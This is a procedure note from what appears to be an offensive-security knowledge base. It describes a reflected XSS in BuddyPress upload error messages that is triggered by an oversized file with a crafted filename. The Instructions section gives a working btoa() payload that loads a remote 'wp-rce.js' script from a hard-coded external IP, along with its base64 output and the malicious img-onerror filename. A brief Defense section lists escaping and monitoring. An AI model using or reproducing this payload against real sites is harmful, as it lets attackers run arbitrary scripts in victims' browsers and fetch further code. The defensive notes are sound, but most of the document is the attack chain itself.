---
id: proc-003
tags:
  - xss
  - file-upload
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/btoa-payload-encode]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:23:32.443Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
---
# Upload Malicious Filename for XSS

## Summary

This procedure crafts and uploads an oversized file with a filename containing a base64-encoded XSS payload, triggering reflection in the BuddyPress upload error message to execute arbitrary JavaScript.

## Description

The vulnerability stems from filenames being output in error messages without escaping (e.g., no esc_html() or .html() processing). By exceeding the upload size limit, the error page reflects the filename, executing an <img> tag's onerror handler that decodes and injects a script loading external JS. This requires social engineering for victim upload but demonstrates the chain.

## Requirements

1. Oversized file (e.g., >2MB PNG with padding)
2. Encoded payload from [[commands/btoa-payload-encode]]
3. Access to upload interface

## Defense

Defensive measures and detection strategies:

- Escape filenames in error outputs using WordPress esc_html()
- Limit filename characters to alphanumerics
- Log and monitor upload attempts with suspicious filenames

## Objectives

1. Trigger size limit error
2. Reflect malicious filename
3. Initiate XSS execution

## Instructions

### Step 1: Encode Payload

**Context**: Use browser console to base64-encode the injection string for obfuscation.

**Command** ([[commands/btoa-payload-encode]]):
```javascript
btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
```

> Expected output: Base64 string like UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=. Replace in filename.

### Step 2: Prepare and Upload File

**Context**: Rename oversized file to include XSS payload and submit.

**Command** (File Upload):

Filename: POC<img src=x onerror='document.write(atob("[BASE64_HERE]"))'>
Select file and upload

> Expected output: Error message like "File too large: [full filename]", triggering XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/btoa-payload-encode]]

## Tools Used


## Tags

- xss
- file-upload
- payload
